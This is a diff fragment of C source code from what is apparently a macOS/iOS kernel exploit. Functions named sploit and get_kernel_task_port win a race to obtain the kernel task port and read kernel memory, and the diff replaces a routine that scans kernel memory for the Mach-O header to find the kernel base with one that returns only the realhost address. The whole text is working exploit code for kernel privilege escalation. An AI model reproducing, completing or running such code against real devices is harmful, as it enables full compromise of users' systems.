@@ -24,15 +24,6 @@ kern_return_t mach_vm_deallocate
 
 extern kern_return_t mach_zone_force_gc(mach_port_t);
 
-kern_return_t mach_vm_read
-(
- vm_map_t target_task,
- mach_vm_address_t address,
- mach_vm_size_t size,
- vm_offset_t *data,
- mach_msg_type_number_t *dataCnt
-);
-
 mach_port_t q() {
   mach_port_t p = MACH_PORT_NULL;
   mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
@@ -370,24 +361,13 @@ void prepare_port(mach_port_t p, mach_port_t host_priv) {
   printf("won the race after %d attempts!\n", attempts+1);
 }
 
-uint64_t find_kernel_base(mach_port_t ktp, uint64_t hostport_addr, uint64_t* _realhost) {
+uint64_t find_realhost(mach_port_t ktp, uint64_t hostport_addr) {
   uint64_t realhost = r64(ktp, hostport_addr+0x68);
   printf("realhost: 0x%llx\n", realhost);
-  
-  *_realhost = realhost;
-  
-  uint64_t base = realhost & ~0xfffULL;
-  // walk down to find the magic:
-  for (int i = 0; i < 0x10000; i++) {
-    if (r32(ktp, base) == 0xfeedfacf) {
-      return base;
-    }
-    base -= 0x1000;
-  }
-  return 0;
+  return realhost;
 }
 
-mach_port_t sploit(mach_port_t host_priv, uint64_t* kernel_base, uint64_t* realhost) {
+mach_port_t sploit(mach_port_t host_priv, uint64_t* realhost) {
   // we can also use the host_priv port for this, also give us the advantage of
   // locating the kernel more easily via realhost later
   
@@ -508,8 +488,8 @@ mach_port_t sploit(mach_port_t host_priv, uint64_t* kernel_base, uint64_t* realh
   
   // we've also found the address of the ipc_port for the host port
   // from which we can determine the kernel base:
-  *kernel_base = find_kernel_base(kernel_task_port, context, realhost);
-  
+  *realhost = find_realhost(kernel_task_port, context);
+
   return kernel_task_port;
 }
 
@@ -532,8 +512,8 @@ void platform_detection() {
 
 }
 
-mach_port_t get_kernel_task_port(mach_port_t host_priv, uint64_t* kernel_base, uint64_t* realhost) {
+mach_port_t get_kernel_task_port(mach_port_t host_priv, uint64_t* realhost) {
   platform_detection();
-  return sploit(host_priv, kernel_base, realhost);
+  return sploit(host_priv, realhost);
 }
 
